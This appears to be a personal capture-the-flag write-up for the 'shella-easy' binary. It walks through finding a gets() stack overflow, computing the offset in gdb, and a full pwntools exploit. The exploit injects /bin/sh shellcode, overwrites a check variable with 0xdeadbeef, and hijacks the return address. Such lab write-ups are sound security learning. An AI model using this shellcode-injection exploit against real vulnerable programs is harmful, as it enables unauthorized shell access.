![[shella-easy]]
### Recon
- ![[Pasted image 20240508194928.png]]
- main function looks like 
- ![[Pasted image 20240508195047.png]]
- the hardcoded value shoud be overwritten of ret is no executed cuz the program is exited
### Finding vulnerability
- gets input size is not specified so we can get more than 64 and over write hardcoded
### Finding Offset
- `disass main` using gdb ![[Pasted image 20240508195318.png]]
- set break point before str cmp `break *main+99`
- run
- give input and search for input where it is stored ![[Pasted image 20240508195429.png]]
- find the address of EIP ![[Pasted image 20240508195507.png]]
- offset: 0xffffcefc - 0xffffceb0 = 76
### Payload
- we have the address of input (displayed)
- `<shell code> + <'0' x (76-len(shell code))> + 0xdeadbeef + <input address> `


```
from pwn import *

target = process('./shella-easy')
#gdb.attach(target, gdbscript = 'b *0x804853e')

# Scan in the first line of text, parse out the infoleak
leak = target.recvline()
leak = leak.strip("Yeah I'll have a ")
leak = leak.strip(" with a side of fries thanks\n")
shellcodeAdr = int(leak, 16)

# Make the payload
payload = ""
# This shellcode is from: http://shell-storm.org/shellcode/files/shellcode-827.php`
payload += "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
payload += "0"*(0x40 - len(payload)) # Padding to the local_c variable
payload += p32(0xdeadbeef) # Overwrite the local_c variable with 0xdeadbeef
payload += "1"*8 # Padding to the return address
payload += p32(shellcodeAdr) # Overwrite the return address to point to the start of our shellcode

# Send the payload
target.sendline(payload)
target.interactive()

```